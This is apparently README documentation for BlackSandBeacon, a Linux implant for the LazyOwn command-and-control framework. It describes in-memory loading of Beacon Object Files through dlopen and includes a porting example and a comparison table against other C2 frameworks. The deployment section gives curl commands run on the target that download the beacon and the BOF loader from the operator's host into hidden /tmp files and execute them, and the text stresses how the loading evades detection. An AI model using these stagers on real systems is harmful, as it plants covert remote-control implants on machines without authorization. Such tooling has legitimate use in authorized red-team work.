## BlackSandBeacon — Linux BOF

**BlackSandBeacon** brings Beacon Object File (BOF) extensibility to Linux for the
first time in an open-source C2 framework. No commercial C2 (including Cobalt Strike)
offers Linux BOF support.

### What is Linux BOF?

On Windows, BOFs are position-independent PE COFF objects loaded by the beacon at
runtime, giving operators an in-memory plugin system without spawning new processes.
BlackSandBeacon ports this model to Linux:

- BOFs compile as **position-independent ELF shared objects** (`.so`) with GCC
  (`-shared -fPIC -nostartfiles`).
- The beacon loads them at runtime via `dlopen` — no disk writes after delivery,
  no new process, no shell.
- The **`datap` API** (`BeaconDataParse`, `BeaconDataInt`, `BeaconDataExtract`,
  `BeaconPrintf`, `BeaconOutput`) is source-compatible with the Windows BOF contract,
  so existing BOF authors can port by replacing Win32 calls with Linux syscalls or
  libc equivalents.
- Advanced BOFs can use **direct syscalls via inline assembly** or `io_uring` for
  kernel interaction without libc linking.

### Deployment via LazyOwn

```bash
# 1. Build and stage the beacon
(LazyOwn) > blacksandbeacon

# 2. Deliver to target (command runs on target)
curl -sk "http://{lhost}:{lport}/blacksandbeacon" -o /tmp/.svc && chmod +x /tmp/.svc && /tmp/.svc &

# 3. Build and stage the BOF loader
(LazyOwn) > blacksandbeacon_bof

# 4. Deliver the BOF loader to a live session
curl -sk "http://{lhost}:{lport}/bof_loader" -o /tmp/.bof && chmod +x /tmp/.bof && /tmp/.bof
```

### Porting a Windows BOF to Linux

```c
// Replace Win32 API calls with direct syscalls or libc equivalents.
// The datap API remains identical.
#include "beacon.h"

void go(char *args, int len) {
    datap parser;
    BeaconDataParse(&parser, args, len);
    char *target = BeaconDataExtract(&parser, NULL);
    // Linux: use syscall(SYS_open, ...) instead of CreateFile
    BeaconPrintf(CALLBACK_OUTPUT, "target: %s\n", target);
}
```

Compile: `gcc -shared -fPIC -nostartfiles -o mybof.so mybof.c`

### Adoption gap this closes

| Capability | Cobalt Strike | Sliver | Havoc | LazyOwn + BlackSandBeacon |
|---|---|---|---|---|
| Windows BOF | Yes | No | No | Yes (via `beacon` addon) |
| Linux BOF | **No** | **No** | **No** | **Yes** |
| ARM BOF | No | No | No | Planned (`blackzincbeacon`) |
| Open source | No | Yes | Yes | Yes |
